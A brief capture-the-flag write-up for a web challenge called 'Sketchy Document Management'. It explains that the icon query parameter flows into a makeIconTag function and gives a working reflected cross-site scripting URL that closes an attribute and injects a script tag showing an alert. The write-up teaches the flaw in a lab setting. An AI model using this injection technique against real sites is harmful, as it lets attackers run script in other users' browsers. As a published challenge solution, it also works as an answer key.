# #57 Sketchy Document Management

Inject an alert("Wizer")

https://chal57-d7yt54n.vercel.app/

# Solution

The `makeIconTag` function is injectable via the `icon` query param.

```js
https://chal57-d7yt54n.vercel.app/?icon=favicon.png"><script>alert('Wizer')</script>
```